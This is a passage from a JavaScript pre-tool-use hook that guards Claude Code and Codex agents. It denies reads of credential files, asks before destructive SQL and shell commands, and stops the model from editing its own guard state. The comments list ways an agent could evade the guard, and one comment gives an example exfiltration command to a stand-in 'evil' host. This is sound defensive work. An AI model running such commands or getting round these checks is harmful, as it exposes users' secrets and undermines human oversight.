    re: /(?:^|\/)\.kube\/config$/,
    why: "kubeconfig contains credentials",
  },
  {
    id: "gcp-sa",
    re: { test: gcpServiceAccount, source: "linear: service[_-]?account … .json" }, // was quadratic
    why: "GCP service-account key",
  },
  {
    id: "gcloud-creds",
    re: { test: gcloudCreds, source: "linear: .config/gcloud/ … credential|token" }, // was quadratic
    why: "gcloud credentials",
  },
  {
    id: "azure-creds",
    re: /(?:^|\/)\.azure\/(credentials|accessTokens)/i,
    why: "Azure credentials",
  },
  {
    id: "creds-json",
    re: /(?:^|\/)credentials\.json$/i,
    why: "credentials file",
  },
  {
    id: "secrets-file",
    re: /(?:^|\/)(secrets?|credentials?)\.(json|ya?ml|toml)$/i,
    why: "secrets configuration file",
  },
  {
    id: "docker-config",
    re: /(?:^|\/)\.docker\/config\.json$/,
    why: "docker config may hold registry auth",
  },
  { id: "netrc", re: /(?:^|\/)\.netrc$/, why: ".netrc contains credentials" },
  {
    id: "npmrc",
    re: /(?:^|\/)\.npmrc$/,
    why: ".npmrc may contain an auth token",
  },
  {
    id: "pypirc",
    re: /(?:^|\/)\.pypirc$/,
    why: ".pypirc contains PyPI credentials",
  },
  {
    id: "gem-creds",
    re: /(?:^|\/)\.gem\/credentials$/,
    why: "RubyGems credentials",
  },
  { id: "vault-token", re: /(?:^|\/)\.?vault-token$/, why: "Vault token" },
  { id: "keystore", re: /\.(keystore|jks)$/i, why: "Java keystore" },
  {
    id: "htpasswd",
    re: /(?:^|\/)\.?htpasswd$/,
    why: "htpasswd contains hashed passwords",
  },
  { id: "pgpass", re: /(?:^|\/)\.pgpass$/, why: "PostgreSQL password file" },
  {
    id: "mycnf",
    re: /(?:^|\/)\.my\.cnf$/,
    why: "MySQL config may contain a password",
  },
  {
    id: "claude-creds",
    re: /(?:^|\/)\.credentials\.json(\.[\w-]+)?$/,
    why: "Claude Code credential store (OAuth tokens)",
  },
];

// ── Layer 4: destructive SQL in any Bash command → ASK / confirm ─────────────
const SQL_DESTRUCTIVE = [
  {
    id: "sql-drop",
    re: /\bDROP\s+(TABLE|VIEW|SCHEMA|DATABASE|CATALOG|VOLUME|FUNCTION|MATERIALIZED\s+VIEW)\b/i,
    why: "SQL DROP statement (irreversible)",
  },
  {
    id: "sql-alter-drop",
    re: perRun(/\bALTER\s+TABLE\b[^;]*\bDROP\s+(PARTITION|COLUMN)\b/i, /\bALTER\s+TABLE\b/i, (c) => c !== 59),
    why: "SQL ALTER TABLE ... DROP (destroys data/columns)",
  },
  {
    id: "sql-truncate",
    re: /\bTRUNCATE\s+(TABLE\s+)?[`"\w]/i,
    why: "SQL TRUNCATE (empties the table)",
  },
  {
    id: "sql-delete-all",
    re: noWhereAfter(/\bDELETE\s+FROM\b/i, "DELETE FROM with no WHERE"),
    why: "SQL DELETE FROM with no WHERE (deletes every row)",
  },
  {
    id: "sql-update-all",
    re: noWhereAfter(/\bUPDATE\s+[`"\w.]+\s+SET\b/i, "UPDATE … SET with no WHERE"),
    why: "SQL UPDATE with no WHERE (rewrites every row)",
  },
];

// ── Layer 0b: "careful mode" Bash commands → ASK (only when careful is enabled) ─
// Legitimate-but-destructive operations that guard.js does NOT block by default, but
// escalates to a confirmation prompt while careful mode is on (via /guard careful on or /guard on).
const CAREFUL = [
  {
    id: "rm-recursive",
    re: /\brm\s+(-\S*[rR]\S*|\S*-[rR]\S*)(\s|$)/,
    why: "recursive rm",
  },
  { id: "git-push", re: /\bgit\s+push\b/, why: "git push" },
  {
    id: "git-checkout-force",
    re: segmentChain([atom(/\bgit\s+checkout\b/), atom(/(-f|--force)\b/)], "git checkout … -f|--force"),
    why: "force checkout (discards local changes)",
  },
  {
    id: "mv-overwrite",
    re: /\bmv\s+(-\S*f|\S*-f)\S*/,
    why: "forced move/overwrite",
  },
  {
    // Was /\bcp\s+[^;|&]*-\S*[rR]\S*f|\bcp\s+[^;|&]*-\S*f\S*[rR]/, which backtracks
    // cubically; same decision, linear time (see cpRecursiveForce).
    id: "cp-recursive-force",
    re: { test: cpRecursiveForce, source: "linear: cp <ws> … -<word with r|R and f>" },
    why: "forced recursive copy (can overwrite)",
  },
  {
    id: "gh-pr-merge",
    re: perRun(/\bgh\b[^;|&\n]*\bpr\s+merge\b/, /\bgh\b/, (c) => !isSepCode(c) && c !== 10),
    why: "gh pr merge (merges a pull request on the remote)",
  },
  {
    // keystone: matches only a checkout/switch to main/master earlier in the SAME command; a
    // bare `git merge` run while already on main is not caught (the hook doesn't read HEAD).
    // Upgrade trigger: a merge into main seen slipping past careful mode in practice — then
    // resolve the branch from cwd (`git symbolic-ref --short HEAD`).
    id: "git-merge-into-main",
    re: { test: gitMergeIntoMain, source: "linear: git-merge-into-main" },
    why: "git merge into main/master",
  },
  {
    id: "truncate-redirect",
    re: /(^|[;&|]\s*)>\s*\/?\w[^;&|]*/,
    why: "shell redirect that truncates a file",
  },
];

// ── Helpers ──────────────────────────────────────────────────────────────────
/** True if a single file path (NOT a whole Bash command) is an allowlisted template. */
function isAllowlisted(s) {
  return !!s && ALLOWLIST.some((re) => re.test(s));
}

// A "word" for allowlist purposes: a run of characters that are not whitespace, quotes,
// backticks, shell operators/grouping, or `=` (so `--env-file=.env.example` splits).
const SHELL_WORD = /[^\s'"`;|&<>()=]+/g;
const ALLOWLIST_PLACEHOLDER = "_allowlisted_";
// A word is never neutralized if it carries expansion, escape, or glob characters (bash may
// split or expand it: `.env$IFS.env.example` reads .env), or a `:` — that marks a remote
// destination (scp/rsync `host:path`, `host::module`, a URL), and erasing it would hide
// the `:` the off-box exfil rules key on (`scp .env evil:x.env.example`).
const SHELL_EXPANSION = /[$\\{}*?[\]:]/;

/**
 * Replace each shell word that is itself an allowlisted template path with a neutral
 * placeholder, IN PLACE (separators are preserved, so the deny regexes still see the
 * real command structure). Everything else — including any secret path or dangerous
 * command sitting next to the template name — is left for the deny/ask layers.
 *   `cat .env.example`         → `cat _allowlisted_`        (allowed)
 *   `cat .env # .env.example`  → `cat .env # _allowlisted_` (still denied)
 */
function neutralizeAllowlisted(cmd) {
  return String(cmd).replace(SHELL_WORD, (word) =>
    isAllowlisted(word) && !SHELL_EXPANSION.test(word) ? ALLOWLIST_PLACEHOLDER : word,
  );
}

// ── Guard state integrity: the model must not quietly lift its own fence ─────
// Every /guard mode runs guard-state.js through the model's Bash tool, so the hook
// cannot tell a user-typed /guard off from a model-initiated one. Rule: anything that could
// REMOVE or WIDEN protection asks a human; forms that only ADD protection pass.
// keystone: string matching only — obfuscated access (globs like keystone-g*, variables
// built at runtime, interpreter one-liners that assemble the name, a copied script) is not
// caught, freeze does not fence Bash at all, and when not frozen the model can Edit the
// installed guard.js / guard-state.js themselves; upgrade trigger: a real bypass seen in
// practice, or Claude Code exposing whether a tool call came from a user slash command.
const STATE_BASENAME = "keystone-guard.json";
const STATE_MENTION = /keystone-guard/i;
const GUARD_STATE_CLI = /guard-state(?:\.js)?(?![\w.-])/gi;
// One shell word as an optional directory argument: a plain word, or a quoted string with
// no expansion/escape characters inside.
const CLI_ARG = String.raw`(?:"[^"$\x60\\]*"|'[^']*'|[^\s"'$\x60\\;&|<>(){}]+)`;
const CLI_STATUS = /^\s*status\s*$/;
const CLI_CAREFUL_ON = /^\s*careful\s+on\s*$/;
const CLI_FREEZE = new RegExp(String.raw`^\s*(?:freeze|guard)(?:\s+${CLI_ARG})?\s*$`);

/** Guard state file paths worth matching beyond the default basename. */
function stateFileCandidates(env) {
  return [GUARD_STATE_FILE, env && env.KEYSTONE_GUARD_FILE]
    .filter(Boolean)
    .map((p) => path.resolve(p));
}

/**
 * A DETECTION-ONLY copy of a command with the characters bash removes when it rejoins a
 * word dropped: quotes, backslashes, backticks, and empty `$()` / `$''` / `$""`. So
 * `keystone-gu''ard.json` and `guard\-state.js` are seen as the names bash will use.
 * Never evaluate the command itself from this copy — it would mangle legitimate quoting.
 */
function dequoted(cmd) {
  return String(cmd)
    .replace(/\$(?:\(\s*\)|''|"")/g, "")
    .replace(/['"\\`]/g, "");
}

// ── Destructive commands that could reach the state file without naming it ────
// `rm -rf ~/.claude` deletes the state file and silently lifts an active freeze. Shell
// expansion (variables, `~user`, braces, most `cd`s) can't be resolved reliably from the
// command text, so this FAILS CLOSED: a destructive segment asks whenever an argument names
// `.claude`, the home directory in any form, a brace expansion, or an unresolved `$`, or an
// earlier segment changed to a directory guard can't name. Resolving literal paths is only
// an extra on top. A `cd` spelled out as an absolute path, `~` or `~/…` (unquoted, nothing to
// expand, HOME not reassigned in the command) IS resolved: later deletes are then checked
// against that directory AND every earlier one (in case the cd failed), so the common
// `cd ~/repo && git rm old.yaml` no longer asks while `cd ~/.claude && rm *` still does.
// keystone: string matching, not a sandbox — a symlink pointing at ~/.claude, or cp/tar/ln
// overwriting the state file, is not caught; upgrade trigger: a real realpath-based resolver
// or an OS-level sandbox if the freeze ever needs to hold against a hostile model.
const DESTRUCTIVE_CMD = /^(?:\S*\/)?(?:rm|rmdir|mv|unlink)$/;
const FIND_CMD = /^(?:\S*\/)?find$/;
const RSYNC_CMD = /^(?:\S*\/)?rsync$/;
const DIR_CHANGE = /^(?:cd|pushd|popd)$/;
// `env -C dir` / `env --chdir=dir` / `sudo -D dir` change directory inside the same segment.
const CHDIR_WRAPPER = /^(?:\S*\/)?(?:env|sudo)$/;
// Fail closed: any flag on an env/sudo wrapper may bundle -C/-D (e.g. `sudo -nD dir`).
const CHDIR_FLAG = /^-/;

function changesDir(words) {
  return (
    words.some((w) => DIR_CHANGE.test(w)) ||
    (words.some((w) => CHDIR_WRAPPER.test(w)) && words.some((w) => CHDIR_FLAG.test(w)))
  );
}

function isDestructive(words) {
  if (words.some((w) => DESTRUCTIVE_CMD.test(w))) return true;
  if (words.some((w) => FIND_CMD.test(w)) && words.includes("-delete")) return true;
  return (
    words.some((w) => RSYNC_CMD.test(w)) &&
    words.some((w) => /^--(?:del$|delete|remove-(?:source|sent)-files)/.test(w))
  );
}

/** An argument whose real target can't be known from the text, or that names ~/.claude. */
function unresolvableArg(word) {
  return (
    /\.claude/i.test(word) ||
    (word.includes("{") && word !== "{}") || // brace expansion; find's bare {} placeholder is literal
    /(?:^|[=:])~/.test(word) || // ~, ~/, ~user (also after --opt= or a : list separator)
    word.includes("$") // $HOME, ${HOME}, $X, $(...): anything still to be expanded
  );
}

/** Literal-path extra: does `word`, resolved against cwd, contain a state file? */
function literalReachesState(word, candidates, cwd) {
  if (!word || word.startsWith("-")) return false;
  const parts = word.split("/");
  const glob = parts.findIndex((seg) => /[*?[]/.test(seg));
  const p = glob < 0 ? word : parts.slice(0, glob).join("/") || (word.startsWith("/") ? "/" : ".");
  const target = path.resolve(cwd || process.cwd(), p).toLowerCase();
  // Case-insensitive: macOS's default filesystem treats ~/.CLAUDE as ~/.claude.
  return candidates.some((c) => isInside(target, c.toLowerCase()));
}

/**
 * The directory a command's LEADING `cd` moves to, else null (unknown). Only one shape is
 * trusted: the raw text starts with `cd <target>` followed by `&&`, `;` or a newline, where
 * the target is `~`, `~/…` or absolute and uses only plain path characters. Anything else
 * (quotes, escapes, redirects, globs, parens, a second cd, or anything before the cd that
 * could reassign HOME) leaves the directory unknown, and destructiveReachesState fails
 * closed. Matching the raw text, anchored at the start, means dequoted() can't make the
 * two views of the command disagree, and resolving at most one cd keeps this linear.
 */
const LEADING_CD = /^[ \t\n]*cd[ \t]+([A-Za-z0-9._\/~+@%,-]+)[ \t]*(?:&&|;|\n)/;
function leadingCdTarget(cmd) {
  const m = LEADING_CD.exec(String(cmd));
  if (!m) return null;
  const target = m[1];
  if (target === "~" || target.startsWith("~/")) return path.join(os.homedir(), target.slice(1));
  return target.startsWith("/") ? path.resolve(target) : null;
}

/**
 * Top-level statements of `text`: split on ; & | and newlines only outside parentheses, so a
 * `$(…)` stays inside the statement that uses it. Linear. Unbalanced parens just make a
 * statement longer, which only makes destructiveReachesState ask more.
 */
function topLevelStatements(text) {
  const out = [];
  let depth = 0;
  let start = 0;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (ch === "(") depth++;
    else if (ch === ")") depth = Math.max(0, depth - 1);
    else if (depth === 0 && (ch === ";" || ch === "&" || ch === "|" || ch === "\n")) {
      out.push(text.slice(start, i));
      start = i + 1;
    }
  }
  out.push(text.slice(start));
  return out;
}

/** True when a destructive segment of `cmd` could remove or move the guard state file. */
function destructiveReachesState(cmd, env, cwd) {
  const candidates = stateFileCandidates(env);
  // Join line continuations first, as the shell does: otherwise `rm -rf \<newline>$(…)`
  // would split the delete from its arguments. (Inside single quotes the join only makes a
  // segment longer, which errs toward asking.)
  const flat = dequoted(String(cmd).replace(/\\\n/g, ""));
  // A `$(…)` inside a delete's own statement can hide its flags or targets from the
  // per-segment split below (`find $(pwd) -delete` splits into `find $` and `-delete`).
  if (
    flat.includes("$(") &&
    topLevelStatements(flat).some(
      (st) => st.includes("$(") && isDestructive(st.split(/[\s()]+/).filter(Boolean)),
    )
  )
    return true;
  const segments = flat
    .split(/[;&|\n()]/)
    .map((seg) => seg.trim().split(/\s+/).filter(Boolean));
  const allWords = segments.flat();
  // dequoted() strips backticks, so check the raw text: a backtick or process substitution
  // anywhere means a destructive segment's real arguments can't be known from the text. A
  // `$(…)` needs no such blanket rule: splitting on `(` leaves its `$` in the destructive
  // segment's own words (`rm -rf $(echo ~)` → `rm -rf $`), which unresolvableArg catches, so
  // an unrelated `x=$(curl …)` elsewhere in the command no longer makes every delete ask.
  const hasSubstitution = /`|[<>]\(/.test(String(cmd)); // `…`, <(…), >(…)
  // Every directory a later segment might run in: the start, plus the leading cd's target
  // (both kept, since after `cd x; …` a failed cd leaves the shell where it was).
  const dirs = [cwd || process.cwd()];
  let unknownDir = false;
  for (const [i, words] of segments.entries()) {
    if (isDestructive(words)) {
      if (unknownDir || changesDir(words) || hasSubstitution) return true;
      // xargs takes its arguments from the pipe, so judge every word in the command.
      const viaXargs = words.some((w) => /^(?:\S*\/)?xargs$/.test(w));
      // xargs -a/--arg-file reads targets from a file the text doesn't show.
      if (viaXargs && words.some((w) => /^(?:-a|--arg-file)(?:=.*)?$/.test(w))) return true;
      const args = viaXargs ? allWords : words;
      if (args.some(unresolvableArg)) return true;
      if (words.some((w) => dirs.some((d) => literalReachesState(w, candidates, d)))) return true;
    }
    if (changesDir(words)) {
      const next = i === 0 && words.length === 2 && words[0] === "cd" ? leadingCdTarget(cmd) : null;
      if (next) dirs.push(next);
      else unknownDir = true;
    }
  }
  return false;
}

/**
 * Does this Bash command reference the guard state file directly, or run a destructive
 * command that could reach it (see destructiveReachesState)?
 */
function bashTouchesStateFile(cmd, env, cwd) {
  const forms = [String(cmd), dequoted(cmd)];
  if (forms.some((c) => STATE_MENTION.test(c))) return true;
  const hit = stateFileCandidates(env).some((p) => {
    if (path.basename(p).toLowerCase() === STATE_BASENAME) return false; // covered above
    return forms.some((c) => c.toLowerCase().includes(p.toLowerCase()));
  });
  return hit || destructiveReachesState(cmd, env, cwd);
}

/** Is this Read/Write target the guard state file? (case-insensitive: macOS default FS) */
function isStateFilePath(fp, cwd, env) {
  const abs = path.resolve(cwd || "", fp).toLowerCase();
  if (path.basename(abs) === STATE_BASENAME) return true;
  return stateFileCandidates(env).some((p) => p.toLowerCase() === abs);
}

/**
 * True when every guard-state.js mention in `cmd` is an exact protection-ADDING form:
 * `status`, `careful on`, or `freeze|guard [dir]` while no freeze is active (re-freezing
 * an active boundary could widen it). Anything else — unfreeze, careful off, extra args,
 * expansions, a bare mention, a copy — is treated as protection-removing. Fails closed.
 * A mention that only appears once quotes/backslashes are removed (`guard-sta""te.js`) is
 * an obfuscated invocation and is never protective. While the state file is corrupt the
 * real boundary is unknown, so only `status` passes.
 */
function guardStateCallsAreProtective(cmd, state) {
  cmd = String(cmd);
  const count = (s) => (s.match(GUARD_STATE_CLI) || []).length;
  if (count(dequoted(cmd)) > count(cmd)) return false;
  const corrupt = !!(state && state.corrupt);
  GUARD_STATE_CLI.lastIndex = 0;
  let m;
  while ((m = GUARD_STATE_CLI.exec(cmd)) !== null) {
    let rest = cmd.slice(m.index + m[0].length);
    if (/^["']/.test(rest)) rest = rest.slice(1); // closing quote of a quoted script path
    // The script name must end the word. `guard-state.js"status;"` is a different file to
    // bash, and as a decoy it would also vanish from the dequoted count above — so treat
    // any glued suffix as non-protective. This keeps every protective raw match present in
    // the dequoted copy, which is what makes the count check sound.
    if (rest && !/^\s/.test(rest)) return false;
    const segment = rest.split(/[;&|\n]/, 1)[0];
    if (CLI_STATUS.test(segment)) continue;
    if (corrupt) return false;
    if (CLI_CAREFUL_ON.test(segment)) continue;
    if (CLI_FREEZE.test(segment) && !(state && state.freeze)) continue;
    return false;
  }
  return true;
}

/**
 * Why `s` is not a valid guard state, or null if it is. Valid: a plain object whose
 * `freeze` is absent/null or a non-empty absolute path, and whose `careful` is
 * absent or a boolean. Shared with guard-state.js so both sides agree on "corrupt".
 */
function stateShapeError(s) {
  if (!s || typeof s !== "object" || Array.isArray(s)) return "not a JSON object";
  if (s.freeze != null && (typeof s.freeze !== "string" || !path.isAbsolute(s.freeze))) {
    return "freeze is not an absolute directory path";
  }
  if (s.careful !== undefined && typeof s.careful !== "boolean") {
    return "careful is not true/false";
  }
  return null;
}

/**
 * Read the opt-in guard state file.
 *   - missing file (ENOENT / ENOTDIR) → {} (baseline: no extra restrictions)
 *   - valid state                    → the state
 *   - anything else (unreadable, invalid JSON, wrong shape) → FAIL CLOSED:
 *     { careful: true, corrupt: <reason> }. A corrupt file used to read as {}, which
 *     silently lifted an active freeze. The freeze boundary itself is unknowable, so
 *     instead of guessing one, evaluate() asks before every Write/Edit and keeps careful
 *     mode on until the file is repaired (guard-state.js freeze|guard|unfreeze).
 */
function readState(file = GUARD_STATE_FILE) {
  let text;
  try {
    text = fs.readFileSync(file, "utf8");
  } catch (e) {
    if (e && (e.code === "ENOENT" || e.code === "ENOTDIR")) return {};
    return { careful: true, corrupt: `unreadable (${(e && e.code) || "error"})` };
  }
  let s;
  try {
    s = JSON.parse(text);
  } catch (_) {
    return { careful: true, corrupt: "invalid JSON" };
  }
  const err = stateShapeError(s);
  return err ? { careful: true, corrupt: err } : s;
}

/** How to repair a corrupt state file. guard-state.js can rewrite bad CONTENT, but not a
 *  path it cannot read (a directory, a permissions problem) — that needs a manual fix. */
function corruptStateHint(reason) {
  return /^unreadable/.test(String(reason))
    ? `fix or remove ${GUARD_STATE_FILE} by hand (guard-state.js cannot rewrite a path it cannot read)`
    : "run `/guard freeze` or `/guard on` to rewrite it, `/guard off` to clear it, or `/guard status` (guard-state.js status) to inspect it";
}

/** True if `target` resolves inside `dir`. Both should be absolute-ish paths. */
function isInside(dir, target) {
  if (!dir || !target) return false;
  const rel = path.relative(dir, target);
  return rel === "" || (!rel.startsWith("..") && !path.isAbsolute(rel));
}

function matchFirst(list, subject) {
  for (const p of list) {
    if (p.re.test(subject)) return p;
  }
  return null;
}

const DENY_EMOJI = "🛑";
const ASK_EMOJI = "⚠️";

function output(decision, why) {
  const isDeny = decision === "deny";
  const emoji = isDeny ? DENY_EMOJI : ASK_EMOJI;
  const tail = isDeny
    ? " (Set KEYSTONE_GUARD_OFF=1 in your shell to bypass if this is intentional.)"
    : " — confirm only if you intend this.";
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: decision,
      permissionDecisionReason: `${emoji} [guard] ${why}.${tail}`,
    },
  };
}

/**
 * Coerce a tool-input field to text. Strings pass; absent → ""; an array of primitives is
 * joined with spaces (so ["rm","-rf","~"] is judged as a command, not "rm,-rf,~"). Any
 * other type returns null — the caller asks rather than letting a malformed input (or a
 * throw on it, which main() would turn into "{}") become an allow.
 */
function asText(v) {
  if (typeof v === "string") return v;
  if (v === undefined || v === null) return "";
  if (Array.isArray(v) && v.every((x) => x === null || typeof x !== "object")) {
    return v.map((x) => String(x)).join(" ");
  }
  return null;
}

/**
 * Core decision. Returns { decision: 'deny'|'ask', why } or null to allow.
 * Exported for tests.
 */
function evaluate(
  toolName,
  toolInput,
  env = process.env,
  cwd = "",
  state = readState(),
) {
  env = env || {};
  if (env.KEYSTONE_GUARD_OFF === "1") return null;
  cwd = typeof cwd === "string" ? cwd : "";
  const input = toolInput && typeof toolInput === "object" ? toolInput : {};

  if (toolName === "Bash") {
    const raw = asText(input.command);
    if (raw === null) {
      return { decision: "ask", why: "the Bash command is not a string, so guard cannot check it" };
    }
    // Allowlisted template names are neutralized per word; the deny/ask layers then run
    // on the remainder. Never short-circuit to allow on an allowlist hit.
    const cmd = neutralizeAllowlisted(raw);

    // deny-level layers first (never legitimate)
    if (DANGEROUS_COMMANDS) {
      const hit = matchFirst(DANGEROUS, cmd);
      if (hit) return { decision: "deny", why: hit.why };
    }
    if (SECRET_EXFIL) {
      const hit = matchFirst(EXFIL, cmd);
      if (hit) return { decision: "deny", why: hit.why };
    }
    // Guard state integrity (ask): checked on the RAW command, after the deny layers. Only
    // while freeze or careful mode is on (or the file is corrupt, which reads as careful):
    // the file holds nothing else, so with both off there is no protection for a delete or
    // edit to lift, and this text heuristic's false positives cost a prompt for nothing.
    const protectionOn = Boolean(state && (state.freeze || state.careful || state.corrupt));
    if (protectionOn && bashTouchesStateFile(raw, env, cwd)) {
      return denyOnCodex({
        decision: "ask",
        why: "this command touches the keystone guard state file (directly, or by removing/moving a directory that contains it), which holds the freeze/careful settings. Use /guard (freeze, careful, on, off) instead",
      });
    }
    if (!guardStateCallsAreProtective(raw, state)) {
      return denyOnCodex({
        decision: "ask",
        why: "this guard-state.js call could lift or widen keystone's guardrails (unfreeze, careful off, or re-freezing an active boundary). Approve only if you asked for it",
      });
    }
    // ask-level layers (legitimate but consequential)
    if (SQL_GUARD) {
      const hit = matchFirst(SQL_DESTRUCTIVE, cmd);
      if (hit) return { decision: "ask", why: hit.why };
    }
    // Layer 0b: careful mode (opt-in) — escalate broad destructive ops to a prompt.
    if (state && state.careful) {
      const hit = matchFirst(CAREFUL, cmd);
      if (hit) return { decision: "ask", why: `careful mode: ${hit.why}` };
    }
    return null;
  }

  const WRITE_TOOLS = ["Edit", "Write", "MultiEdit", "NotebookEdit"];
  if (toolName === "Read" || WRITE_TOOLS.includes(toolName)) {
    const fp = asText(input.file_path || input.notebook_path);
    if (fp === null) {
      return { decision: "ask", why: "the target file path is not a string, so guard cannot check it" };
    }

    // Secret-file block (always on, every tool) — keep this first.
    if (
      SECRET_FILES &&
      env.KEYSTONE_ALLOW_SECRETS !== "1" &&
      fp &&
      !isAllowlisted(fp)
    ) {
      const hit = matchFirst(SECRET_FILE_PATTERNS, fp);
      if (hit) {
        const verb =
          toolName === "Read"
            ? "read"
            : toolName === "Edit"
              ? "modify"
              : "write";
        return { decision: "deny", why: `cannot ${verb} ${hit.why}` };
      }
    }

    // Layer 0a: freeze boundary (opt-in) — deny writes outside the allowed dir.
    if (state && state.freeze && WRITE_TOOLS.includes(toolName) && fp) {
      const abs = path.isAbsolute(fp) ? fp : path.resolve(cwd || "", fp);
      if (!isInside(state.freeze, abs)) {
        return {
          decision: "deny",
          why: `freeze active: edits restricted to ${state.freeze} (this targets outside it). Run /guard off to lift`,
        };
      }
    }

    // Corrupt state file (fail closed) — the freeze boundary is unknown, so confirm every
    // edit until it is repaired. After the deny layers, so a deny still wins.
    if (state && state.corrupt && WRITE_TOOLS.includes(toolName)) {
      return {
        decision: "ask",
        why: `the keystone guard state file is ${state.corrupt}, so any freeze boundary is unknown — ${corruptStateHint(state.corrupt)}`,
      };
    }

    // Guard state integrity (ask) — after every deny layer, so a deny always wins.
    if (WRITE_TOOLS.includes(toolName) && fp && isStateFilePath(fp, cwd, env)) {
      return denyOnCodex({
        decision: "ask",
        why: "this edits the keystone guard state file directly (it holds the freeze/careful settings). Use /guard (freeze, careful, on, off) instead",
      });
    }
    return null;
  }

  // Codex CLI runs this hook for its apply_patch tool (Write/Edit are matcher aliases there).
  if (toolName === "apply_patch") {
    const parsed = patchPaths
      ? patchPaths.parsePatch(input.command)
      : { ok: false, error: "patch-paths.js is missing" };
    if (!parsed.ok) {
      return denyOnCodex({ decision: "ask", why: `the apply_patch input is not a patch guard can read (${parsed.error})` });
    }
    const targets = [];
    for (const h of parsed.hunks) {
      targets.push({ tool: h.kind === "add" ? "Write" : "Edit", path: h.path });
      if (h.movePath !== null) targets.push({ tool: "Write", path: h.movePath });
    }
    // Codex resolves relative paths against the selected environment's cwd; with an
    // Environment ID that may not be the hook's cwd.
    return denyOnCodex(evaluatePatchTargets(targets, env, cwd, state, parsed.environmentId !== null));
  }

  return null;
}

// ── Codex: "ask" fails open ──────────────────────────────────────────────────
// Codex CLI (0.166) treats permissionDecision "ask" as unsupported and runs the call
// (codex-rs/hooks/src/events/pre_tool_use.rs, unsupported_permission_decision_fails_open).
// Asks that guard a patch or the guard's own state are tagged here; decide() turns a
// tagged ask into a deny when the payload comes from Codex. Every other ask (careful mode,
// SQL) stays an ask, which Codex ignores.
function denyOnCodex(r) {
  if (r && r.decision === "ask") r.denyOnCodex = true;
  return r;
}

/**
 * Codex's PreToolUse stdin always carries string `turn_id` and `model`
 * (codex-rs/hooks/src/schema.rs, PreToolUseCommandInput). Claude Code's PreToolUse input has
 * neither: its hooks reference documents `turn_id` only for MessageDisplay and `model` only
 * for SessionStart. Requiring both keeps an ambiguous payload on the Claude Code (ask) side.
 */
function isCodexPayload(data) {
  if (!data) return false;
  // apply_patch is a Codex-only tool, so its asks must never fail open, whatever fields a
  // future Codex payload carries. Treating it as Codex only ever turns an ask into a deny.
  if (data.tool_name === "apply_patch") return true;
  return typeof data.turn_id === "string" && typeof data.model === "string";
}

/**
 * The decision for one hook payload — the only place that depends on the harness.
 * evaluate() is harness-neutral. On Codex: a Bash command also gets the shell-form patch
 * check (Codex's shell can run apply_patch; Claude Code's cannot), and a tagged ask becomes
 * a deny. On anything else the result is evaluate()'s, unchanged.
 */
function decide(data, env = process.env, state = readState()) {
  data = data && typeof data === "object" ? data : {};
  env = env || {};
  const cwd = typeof data.cwd === "string" ? data.cwd : "";
  let r = evaluate(data.tool_name, data.tool_input, env, cwd, state);
  if (!isCodexPayload(data)) return r;
  const input = data.tool_input && typeof data.tool_input === "object" ? data.tool_input : {};
  if (data.tool_name === "Bash" && typeof input.command === "string" && env.KEYSTONE_GUARD_OFF !== "1") {
    // evaluate() runs its deny layers first; any other result yields to a patch finding.
    if (!(r && r.decision === "deny")) r = evaluateShellPatch(input.command, env, cwd, state) || r;
  }
  if (!r || r.decision !== "ask" || !r.denyOnCodex) return r;
  return { decision: "deny", why: `${r.why} (Codex hooks cannot ask for confirmation, so guard denies instead)` };
}

// ── Codex apply_patch ────────────────────────────────────────────────────────

/**
 * Run every patch target through exactly the checks a Write/Edit to it gets. Any deny →
 * deny; else any ask → ask; else null. `cwdUnknown`: relative paths may not resolve
 * against `cwd`, so under a freeze they cannot be checked.
 */
function evaluatePatchTargets(targets, env, cwd, state, cwdUnknown) {
  if (targets.length === 0) {
    return { decision: "ask", why: "the patch names no files, so guard cannot check it" };
  }
  let ask = null;
  for (const t of targets) {
    if (!t.path) {
      ask = ask || { decision: "ask", why: "the patch has an empty file path, so guard cannot check it" };
      continue;
    }
    if (cwdUnknown && !path.isAbsolute(t.path) && state && (state.freeze || state.corrupt)) {
      ask = ask || {
        decision: "ask",
        why: `apply_patch target ${t.path}: its base directory is not the hook's cwd, so the freeze boundary cannot be checked`,
      };
    }
    // Codex resolves `.` and `..` segments before writing (`.env/.` writes `.env`), so check
    // the resolved path as well as the raw one.
    for (const fp of new Set([t.path, path.resolve(cwd || "", t.path)])) {
      const r = evaluate(t.tool, { file_path: fp }, env, cwd, state);
      if (r && r.decision === "deny") return { decision: "deny", why: `apply_patch target ${t.path}: ${r.why}` };
      if (r) ask = ask || { decision: "ask", why: `apply_patch target ${t.path}: ${r.why}` };
    }
  }
  return ask;
}

// Shell-form patches reach this hook as Bash: the heredoc Codex intercepts inside
// exec_command (`apply_patch <<'EOF' …`, `cd <dir> && apply_patch <<'EOF' …`), and any
// other call of the real `apply_patch` binary Codex puts on PATH (`apply_patch '<patch>'`).
// keystone: header-line scan of the command text (as written, and with `\n` escapes
// expanded) in any command naming apply_patch — a superset of Codex's tree-sitter match, but
// a patch fed from a file, a variable or write_stdin is not visible here; upgrade trigger: a
// real bypass seen that way, or Codex changing its intercepted shell forms.
const APPLY_PATCH_WORD = /\bapply_?patch\b/;
const SHELL_CD = /^\s*cd\s+(?:"([^"$`\\]*)"|'([^']*)'|([^\s"'$`\\;&|<>(){}]+))\s*&&/;

function evaluateShellPatch(cmd, env, cwd, state) {
  if (!APPLY_PATCH_WORD.test(dequoted(cmd))) return null;
  if (!patchPaths) {
    return denyOnCodex({
      decision: "ask",
      why: "this command names apply_patch, but patch-paths.js is missing, so guard cannot check the patch",
    });
  }
  const seen = new Set();
  const targets = [];
  for (const text of [cmd, cmd.replace(/\\n/g, "\n")]) {
    for (const h of patchPaths.headerLines(text)) {
      if (seen.has(`${h.kind}\0${h.path}`)) continue;
      seen.add(`${h.kind}\0${h.path}`);
      targets.push({ tool: h.kind === "add" || h.kind === "move" ? "Write" : "Edit", path: h.path });
    }
  }
  if (targets.length === 0) return null;
  const cd = SHELL_CD.exec(cmd);
  const base = cd ? path.resolve(cwd || "", cd[1] ?? cd[2] ?? cd[3]) : cwd;
  // Any other directory change before the heredoc leaves relative paths unresolvable.
  const head = dequoted(cmd.slice(cd ? cd[0].length : 0).split("<<")[0]);
  const cwdUnknown = head.split(/[;&|\n()]/).some((seg) => changesDir(seg.trim().split(/\s+/)));
  return denyOnCodex(evaluatePatchTargets(targets, env, base, state, cwdUnknown));
}

async function main() {
  let input = "";
  for await (const chunk of process.stdin) input += chunk;
  let data;
  try {
